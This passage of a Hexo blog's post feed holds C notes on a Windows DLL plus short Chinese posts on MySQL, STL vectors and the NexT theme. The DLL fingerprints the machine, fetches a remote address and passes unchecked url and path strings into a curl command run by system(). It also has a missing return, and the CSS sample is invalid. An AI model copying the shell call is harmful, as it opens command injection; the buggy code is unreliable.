class="type">char</span>* str, <span class="type">unsigned</span> <span class="type">char</span>* digest)</span> </span>&#123;</span><br><span class="line">	MD5_CTX ctx;</span><br><span class="line">	<span class="built_in">MD5_Init</span>(&amp;ctx);</span><br><span class="line">	<span class="built_in">MD5_Update</span>(&amp;ctx, str, <span class="built_in">strlen</span>(str));</span><br><span class="line">	<span class="built_in">MD5_Final</span>(digest, &amp;ctx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sprint_md5</span><span class="params">(<span class="type">char</span>* out, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* digest)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MD5_DIGEST_LENGTH; ++i) &#123;</span><br><span class="line">		<span class="built_in">sprintf_s</span>(out + i * <span class="number">2</span>, MD5_DIGEST_LENGTH * <span class="number">2</span> + <span class="number">1</span> - i * <span class="number">2</span>, <span class="string">&quot;%02x&quot;</span>, digest[i]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">getUUIDmd5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> UUIDMD5[MD5_DIGEST_LENGTH * <span class="number">2</span> + <span class="number">1</span>];</span><br><span class="line">    FILE* fp;</span><br><span class="line">    <span class="type">char</span> uuid[<span class="number">255</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> digest[MD5_DIGEST_LENGTH];</span><br><span class="line">    <span class="type">char</span> md5string[MD5_DIGEST_LENGTH * <span class="number">2</span> + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((fp = _popen(<span class="string">&quot;wmic csproduct get UUID&quot;</span>, <span class="string">&quot;r&quot;</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fgets</span>(uuid, <span class="built_in">sizeof</span>(uuid), fp);</span><br><span class="line">    <span class="built_in">fgets</span>(uuid, <span class="built_in">sizeof</span>(uuid), fp);</span><br><span class="line">    uuid[<span class="built_in">strcspn</span>(uuid, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_pclose(fp) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">compute_md5</span>(uuid, digest);</span><br><span class="line">    <span class="built_in">sprint_md5</span>(md5string, digest);</span><br><span class="line">    <span class="built_in">strcpy_s</span>(UUIDMD5, <span class="built_in">sizeof</span>(UUIDMD5), md5string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">handle_errors</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">ERR_print_errors_fp</span>(stderr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">getIPaPORT</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* url, <span class="type">const</span> <span class="type">char</span>* path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> IPANDPORT[<span class="number">0x100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> host[<span class="number">256</span>], service[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">addrinfo</span> hints, * res, * p;</span><br><span class="line">    <span class="type">int</span> sockfd, n;</span><br><span class="line">    <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line">    SSL_CTX* ctx;</span><br><span class="line">    SSL* ssl;</span><br><span class="line"></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;WSAStartup failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">SSL_library_init</span>();</span><br><span class="line">    <span class="built_in">OpenSSL_add_all_algorithms</span>();</span><br><span class="line">    <span class="built_in">SSL_load_error_strings</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf_s</span>(url, <span class="string">&quot;https://%[^/]/&quot;</span>, host, (<span class="type">unsigned</span>)_countof(host)) != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Invalid URL\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy_s</span>(service, <span class="built_in">sizeof</span>(service), <span class="string">&quot;https&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;hints, <span class="number">0</span>, <span class="keyword">sizeof</span> hints);</span><br><span class="line">    hints.ai_family = AF_UNSPEC;</span><br><span class="line">    hints.ai_socktype = SOCK_STREAM;</span><br><span class="line">    <span class="type">int</span> status = <span class="built_in">getaddrinfo</span>(host, service, &amp;hints, &amp;res);</span><br><span class="line">    <span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;getaddrinfo: %s\n&quot;</span>, <span class="built_in">gai_strerror</span>(status));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (p = res; p != <span class="literal">NULL</span>; p = p-&gt;ai_next) &#123;</span><br><span class="line">        sockfd = <span class="built_in">socket</span>(p-&gt;ai_family, p-&gt;ai_socktype, p-&gt;ai_protocol);</span><br><span class="line">        <span class="keyword">if</span> (sockfd == <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">connect</span>(sockfd, p-&gt;ai_addr, p-&gt;ai_addrlen) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">closesocket</span>(sockfd);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Failed to connect\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ctx = <span class="built_in">SSL_CTX_new</span>(<span class="built_in">TLS_client_method</span>());</span><br><span class="line">    <span class="keyword">if</span> (ctx == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">handle_errors</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ssl = <span class="built_in">SSL_new</span>(ctx);</span><br><span class="line">    <span class="keyword">if</span> (ssl == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">handle_errors</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">SSL_set_fd</span>(ssl, sockfd);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">SSL_connect</span>(ssl) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">handle_errors</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> request[<span class="number">512</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(request, <span class="built_in">sizeof</span>(request), <span class="string">&quot;GET %s HTTP/1.1\r\nHost: %s\r\n\r\n&quot;</span>, path, host);</span><br><span class="line">    <span class="built_in">SSL_write</span>(ssl, request, <span class="built_in">strlen</span>(request));</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">    <span class="keyword">while</span> ((n = <span class="built_in">SSL_read</span>(ssl, buffer, BUFFER_SIZE - <span class="number">1</span>)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">strcpy_s</span>(IPANDPORT, <span class="built_in">sizeof</span>(IPANDPORT), <span class="built_in">strstr</span>(buffer, <span class="string">&quot;\r\n\r\n&quot;</span>) + <span class="number">4</span>);</span><br><span class="line">        <span class="built_in">memset</span>(buffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">        <span class="keyword">goto</span> A;</span><br><span class="line">    &#125;</span><br><span class="line">A:</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">handle_errors</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">SSL_free</span>(ssl);</span><br><span class="line">    <span class="built_in">SSL_CTX_free</span>(ctx);</span><br><span class="line">    <span class="built_in">freeaddrinfo</span>(res);</span><br><span class="line">    <span class="built_in">closesocket</span>(sockfd);</span><br><span class="line">    <span class="built_in">EVP_cleanup</span>();</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _strdup(IPANDPORT);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">file_notexists</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filename)</span> </span>&#123;</span><br><span class="line">    FILE* file = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fopen_s</span>(&amp;file, filename, <span class="string">&quot;r&quot;</span>) != <span class="number">0</span> || file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">fclose</span>(file);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">curlDownload</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* path, <span class="type">const</span> <span class="type">char</span>* url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> curlcmd[<span class="number">0x300</span>];</span><br><span class="line">    <span class="built_in">sprintf_s</span>(curlcmd, <span class="built_in">sizeof</span>(curlcmd), <span class="string">&quot;curl -o %s %s&quot;</span>, path, url);</span><br><span class="line">    <span class="built_in">system</span>(curlcmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printc</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str, <span class="type">char</span>* style, <span class="type">int</span> ForegroundColor, <span class="type">int</span> BackgroundColor)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> styleStr[<span class="number">50</span>] = <span class="string">&quot;\033[&quot;</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> addedStyles[<span class="number">10</span>] = &#123; <span class="literal">false</span> &#125;;</span><br><span class="line">    <span class="keyword">if</span> (style != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; style[i] != <span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> styleCode = style[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (!addedStyles[styleCode]) &#123;</span><br><span class="line">                len += <span class="built_in">sprintf_s</span>(styleStr + len, <span class="built_in">sizeof</span>(styleStr) - len, <span class="string">&quot;%dm;&quot;</span>, styleCode);</span><br><span class="line">                addedStyles[styleCode] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ForegroundColor &lt;= <span class="number">7</span> &amp;&amp; ForegroundColor &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        len += <span class="built_in">sprintf_s</span>(styleStr + len, <span class="built_in">sizeof</span>(styleStr) - len, <span class="string">&quot;3%dm;&quot;</span>, ForegroundColor);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        len += <span class="built_in">sprintf_s</span>(styleStr + len, <span class="built_in">sizeof</span>(styleStr) - len, <span class="string">&quot;%37m;&quot;</span>, ForegroundColor);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (BackgroundColor &lt;= <span class="number">7</span> &amp;&amp; BackgroundColor &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        len += <span class="built_in">sprintf_s</span>(styleStr + len, <span class="built_in">sizeof</span>(styleStr) - len, <span class="string">&quot;4%dm;&quot;</span>, BackgroundColor);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        len += <span class="built_in">sprintf_s</span>(styleStr + len, <span class="built_in">sizeof</span>(styleStr) - len, <span class="string">&quot;%40m;&quot;</span>, BackgroundColor);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        styleStr[len - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s%s\033[0m\033[1m&quot;</span>, styleStr, str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库</title>
    <url>/2024/07/19/database/</url>
    <content><![CDATA[<h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><h2 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h2><span id="more"></span>

<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>1.数据库</p>
<p>数据库就是用来存储各种数据的容器</p>
<p>2.数据库管理系统</p>
<p>专门用于创建和管理数据库的统一软件，介于应用和操作系统之间。比如MYSQL、SQL Server、Oracle等。他们不仅有基础的数据管理功能，还能保证数据的完整性、安全性和可靠性</p>
<p>3.数据库应用程序</p>
<p>通过数据库管理系统提供的接口与之通信、访问和管理数据的应用程序</p>
<p>4.SQL语言</p>
<p>它是一种数据库查询语言和程序设计语言，主要用于管理数据库中的数据，如存储数据、查询数据、更新数据</p>
<h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><p>MYSQL<a href="https://dev.mysql.com/downloads/mysql/">下载链接</a></p>
<p>历史版本<a href="https://download.mysql.com/archives">下载链接</a>，选择MySQL Community Server</p>
<p>下载使用5.0的最高版本5.0.96</p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>启动服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">net start mysql</span><br></pre></td></tr></table></figure>

<p>关闭服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">net stop mysql</span><br></pre></td></tr></table></figure>

<p>登录：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql -h localhost -u root -p</span><br></pre></td></tr></table></figure>

<p>登录也可以直接打开MySQL Command Line Client</p>
<p><img src="/2024/07/19/database/image-20240719221312406.png" alt="image-20240719221312406"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; help</span><br><span class="line"></span><br><span class="line">For information about MySQL products and services, visit:</span><br><span class="line">   http://www.mysql.com/</span><br><span class="line">For developer information, including the MySQL Reference Manual, visit:</span><br><span class="line">   http://dev.mysql.com/</span><br><span class="line">To buy MySQL Enterprise support, training, or other products, visit:</span><br><span class="line">   https://shop.mysql.com/</span><br><span class="line"></span><br><span class="line">List of all MySQL commands:</span><br><span class="line">Note that all text commands must be first on line and end with &#x27;;&#x27;</span><br><span class="line">?         (\?) Synonym for `help&#x27;.</span><br><span class="line">clear     (\c) Clear the current input statement.</span><br><span class="line">connect   (\r) Reconnect to the server. Optional arguments are db and host.</span><br><span class="line">delimiter (\d) Set statement delimiter.</span><br><span class="line">ego       (\G) Send command to mysql server, display result vertically.</span><br><span class="line">exit      (\q) Exit mysql. Same as quit.</span><br><span class="line">go        (\g) Send command to mysql server.</span><br><span class="line">help      (\h) Display this help.</span><br><span class="line">notee     (\t) Don&#x27;t write into outfile.</span><br><span class="line">print     (\p) Print current command.</span><br><span class="line">prompt    (\R) Change your mysql prompt.</span><br><span class="line">quit      (\q) Quit mysql.</span><br><span class="line">rehash    (\#) Rebuild completion hash.</span><br><span class="line">source    (\.) Execute an SQL script file. Takes a file name as an argument.</span><br><span class="line">status    (\s) Get status information from the server.</span><br><span class="line">tee       (\T) Set outfile [to_outfile]. Append everything into given outfile.</span><br><span class="line">use       (\u) Use another database. Takes database name as argument.</span><br><span class="line">charset   (\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.</span><br><span class="line">warnings  (\W) Show warnings after every statement.</span><br><span class="line">nowarning (\w) Don&#x27;t show warnings after every statement.</span><br><span class="line"></span><br><span class="line">For server side help, type &#x27;help contents&#x27;</span><br></pre></td></tr></table></figure>





















]]></content>
  </entry>
  <entry>
    <title>STL</title>
    <url>/2024/07/18/STL/</url>
    <content><![CDATA[<h1 id="STL"><a href="#STL" class="headerlink" title="STL"></a>STL</h1><h2 id="vector容器"><a href="#vector容器" class="headerlink" title="vector容器"></a>vector容器</h2><h3 id="创建vector容器"><a href="#创建vector容器" class="headerlink" title="创建vector容器"></a>创建vector容器</h3><p>1.导入头文件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>2.构造vector容器</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; v1;		<span class="comment">//空的容器，里面没有元素</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">v2</span><span class="params">(<span class="number">100</span>)</span>;	<span class="comment">//100个元素数据，默认都为0</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">v3</span><span class="params">(<span class="number">100</span>,<span class="number">8</span>)</span>;	<span class="comment">//100个值为8的元素</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">v4</span><span class="params">(v3)</span>;		<span class="comment">//100个值为8的元素</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> nTmpAry[] = &#123;<span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>&#125;;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">v5</span><span class="params">(nTmpAry + <span class="number">2</span>, nTmpAry + <span class="number">5</span>)</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/18/STL/image-20240718153228054.png" alt="image-20240718153228054"></p>
<h3 id="vector容器添加元素"><a href="#vector容器添加元素" class="headerlink" title="vector容器添加元素"></a>vector容器添加元素</h3><h4 id="1-push-back"><a href="#1-push-back" class="headerlink" title="1.push_back"></a>1.push_back</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v1.<span class="built_in">push_back</span>();</span><br></pre></td></tr></table></figure>

<p>将元素添加到v1容器的尾部</p>
<h4 id="2-insert"><a href="#2-insert" class="headerlink" title="2.insert"></a>2.insert</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">v1.<span class="built_in">insert</span>(v1.<span class="built_in">begin</span>(), <span class="number">99</span>);</span><br></pre></td></tr></table></figure>

<p>从v1的第一个元素开始插入一个99</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">v1.<span class="built_in">insert</span>(v1.<span class="built_in">begin</span>() + <span class="number">3</span>, <span class="number">2</span>, <span class="number">98</span>);</span><br></pre></td></tr></table></figure>

<p>从v1开始向后偏移三个的位置开始插入两个元素98</p>
]]></content>
  </entry>
  <entry>
    <title>PolishMyBlog</title>
    <url>/2024/07/13/PolishMyBlog/</url>
    <content><![CDATA[<p>
    <div style="font-size: 55px; font-weight: bold; font-family: 'Times New Roman', serif; color: #5a5a5a">
        hexo × NexT
</div>
<br>
<div style="font-size: 25px; font-weight: bold; font-family: 'Times New Roman', serif; color: #7f7f7f">
    如何修改一个这样↓↓↓的主题
</div>
</p>




<p><img src="/2024/07/13/PolishMyBlog/image-20240713214740457.png" alt="image-20240713214740457"></p>
<span id="more"></span>

<h1 id="NexT"><a href="#NexT" class="headerlink" title="NexT"></a>NexT</h1><p>NexT是hexo的主题插件，首先要安装了hexo</p>
<h2 id="NexT安装和概况"><a href="#NexT安装和概况" class="headerlink" title="NexT安装和概况"></a>NexT安装和概况</h2><p>进入博客的路径，执行一下命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/13/PolishMyBlog/image-20240713215651747.png" alt="image-20240713215651747"></p>
<p>找到博客目录下面的config文件</p>
<img src="/2024/07/13/PolishMyBlog/image-20240713215758194.png" alt="image-20240713215758194" style="zoom:67%;">

<p>这里推荐用VS Code直接把整个博客文件夹打开，方便后面直接操作</p>
<img src="/2024/07/13/PolishMyBlog/image-20240713215953724.png" alt="image-20240713215953724" style="zoom:67%;">

<p>这里本来是landscape，改成next即可</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713220125493.png" alt="image-20240713220125493"></p>
<p>确保theme文件夹下面有next文件夹</p>
<img src="/2024/07/13/PolishMyBlog/image-20240713220210340.png" alt="image-20240713220210340" style="zoom:50%;">

<p>注意区分<strong>主题配置文件</strong>和<strong>站点配置文件</strong></p>
<img src="/2024/07/13/PolishMyBlog/image-20240713220338496.png" alt="image-20240713220338496" style="zoom:50%;">



<p>打开<strong>主题配置文件</strong>发现里面将近1000行，说明提供的选项还是非常多的</p>
<h2 id="NexT使用"><a href="#NexT使用" class="headerlink" title="NexT使用"></a>NexT使用</h2><p>先扔出一个<a href="https://theme-next.iissnan.com/getting-started.html">使用文档</a>，所有的使用方法基本上都在这里面，这里只教出现在我的博客里的，我这里没有的去前面的文档搜或者搜一下“hexo next 某某功能即可”</p>
<h3 id="4个主题"><a href="#4个主题" class="headerlink" title="4个主题"></a>4个主题</h3><p>首先确定一个主题：<br><img src="/2024/07/13/PolishMyBlog/image-20240713220816585.png" alt="image-20240713220816585"></p>
<p><a href="https://cn.bing.com/">看看四个主题有哪些不同</a>(自己搜一下)，想用哪个主题就把前面的注释删掉，留下一个就可以</p>
<h3 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h3><img src="/2024/07/13/PolishMyBlog/image-20240713221145429.png" alt="image-20240713221145429" style="zoom:67%;">

<p>在<strong>主题配置文件</strong>中搜索<strong>menu</strong>字段</p>
<img src="/2024/07/13/PolishMyBlog/image-20240713221242044.png" alt="image-20240713221242044" style="zoom:80%;">

<p>需要哪些就打开哪些</p>
<h3 id="头像栏"><a href="#头像栏" class="headerlink" title="头像栏"></a>头像栏</h3><p><img src="/2024/07/13/PolishMyBlog/image-20240713221355666.png" alt="image-20240713221355666"></p>
<p>搜索<strong>avatar</strong>字段</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713221436424.png" alt="image-20240713221436424"></p>
<p>URL填一个链接，rounded就是圆形，rotated是旋转</p>
<h3 id="我的NOTICE"><a href="#我的NOTICE" class="headerlink" title="我的NOTICE"></a>我的NOTICE</h3><img src="/2024/07/13/PolishMyBlog/image-20240713221532135.png" alt="image-20240713221532135" style="zoom:67%;">

<p>这个NOTICE其实也是一篇笔记，把它置顶就变成了一个NOTICE或者自己编写的目录</p>
<p>如何置顶：top写大点，<strong>如果置顶多篇</strong>，也可以通过<strong>设置top的大小</strong>决定哪一篇置顶在最上面，哪一篇置顶在第二个</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713222515503.png" alt="image-20240713222515503"></p>
<p>这一篇是直接用html写的</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713221731239.png" alt="image-20240713221731239"></p>
<p>最下面的图片也是svg图标，这个图标想弄的话直接<strong>去iconfont抢</strong>就完了，找到喜欢的图标，调好颜色，打开开发者工具，找到这个图标的svg标签，复制下来就完了</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713221918223.png" alt="image-20240713221918223"></p>
<h3 id="阅读时长统计"><a href="#阅读时长统计" class="headerlink" title="阅读时长统计"></a>阅读时长统计</h3><p>搜索<strong>symbols_count_time</strong>字段</p>
<img src="/2024/07/13/PolishMyBlog/image-20240713222307119.png" alt="image-20240713222307119" style="zoom:67%;">

<p>NexT好像已经直接支持了这个插件，如果不支持的话就下一个</p>
<h3 id="访客量统计"><a href="#访客量统计" class="headerlink" title="访客量统计"></a>访客量统计</h3><p>搜索<strong>busuanzi</strong>字段（不蒜子）</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713222424045.png" alt="image-20240713222424045"></p>
<p>这几个都改成true即可</p>
<h3 id="阅读更多按钮"><a href="#阅读更多按钮" class="headerlink" title="阅读更多按钮"></a>阅读更多按钮</h3><p>在想要在主页上折叠的位置，在md中添加这么一个东西就行，不加这个的话，主页上会显示所有的文章，加载起来也非常慢</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713230143130.png" alt="image-20240713230143130"></p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713230336767.png" alt="image-20240713230336767"></p>
<h3 id="圆角"><a href="#圆角" class="headerlink" title="圆角"></a>圆角</h3><img src="/2024/07/13/PolishMyBlog/image-20240713222720381.png" alt="image-20240713222720381" style="zoom:67%;">

<p><strong>Gemini主题</strong>默认是没有圆角的，上网搜也没搜到，通过自己摸索得出了一个方法</p>
<img src="/2024/07/13/PolishMyBlog/image-20240713222919893.png" alt="image-20240713222919893" style="zoom:67%;">

<p>找到这个文件，打开它</p>
<p><img src="/2024/07/13/PolishMyBlog/7d8690bb39833ee325fc75634bd90c8.png" alt="7d8690bb39833ee325fc75634bd90c8"></p>
<p>打开网页看一下，这个东西叫post-block，所以直接在这个文件末尾添加</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.post-block</span> &#123;</span><br><span class="line">  <span class="attribute">border-radius</span> = <span class="number">15px</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就搞定了</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713223143014.png" alt="image-20240713223143014"></p>
<h3 id="关于Mist主题分界线"><a href="#关于Mist主题分界线" class="headerlink" title="关于Mist主题分界线"></a>关于Mist主题分界线</h3><p>Mist主题分界线好像没有，这导致上一篇和下一篇看起来没有分隔，不好看</p>
<p><img src="/2024/07/13/PolishMyBlog/image-20240713223334965.png" alt="image-20240713223334965"></p>
